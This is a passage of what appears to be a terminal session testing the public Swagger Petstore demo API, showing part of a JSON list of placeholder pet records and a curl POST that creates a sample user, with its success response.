vailable"},{"id":9223372036854775798,"category":{"id":0,"name":"string"},"name":"Doggie","photoUrls":["string"],"tags":[{"id":0,"name":"string"}],"status":"available"},{"id":9223372036854775801,"category":{"id":0,"name":"string"},"name":"Doggie","photoUrls":["string"],"tags":[{"id":0,"name":"string"}],"status":"available"},{"id":9223372036854775802,"category":{"id":0,"name":"string"},"name":"Doggie","photoUrls":["string"],"tags":[{"id":0,"name":"string"}],"status":"available"},{"id":9223372036854775803,"category":{"id":0,"name":"string"},"name":"Doggie","photoUrls":["string"],"tags":[{"id":0,"name":"string"}],"status":"available"},{"id":9222968140497180179,"category":{"id":0,"name":"string"},"name":"test","photoUrls":["string"],"tags":[{"id":0,"name":"string"}],"status":"available"},{"id":15555,"category":{"id":0,"name":"puppy"},"name":"doggie","photoUrls":["string"],"tags":[{"id":0,"name":"Charlie"}],"status":"available"},{"id":147,"category":{"id":0,"name":"GATY"},"name":"doggie","photoUrls":["string"],"tags":[{"id":0,"name":"string"}],"status":"available"}]%  
+                                                                                       kristinius@YamahaMG10XUv03 ~ % curl -X POST 'https://petstore.swagger.io/v2/user' \
+-H 'accept: application/json' \
+-H 'Content-Type: application/json' \
+-d '{
+  "id": 123,
+  "username": "new_user",
+  "firstName": "First",
+  "lastName": "Last",
+  "email": "email@example.com",
+  "password": "password",
+  "phone": "1234567890",
+  "userStatus": 0
+}'
+
+{"code":200,"type":"unknown","message":"123"}%                                                                                        
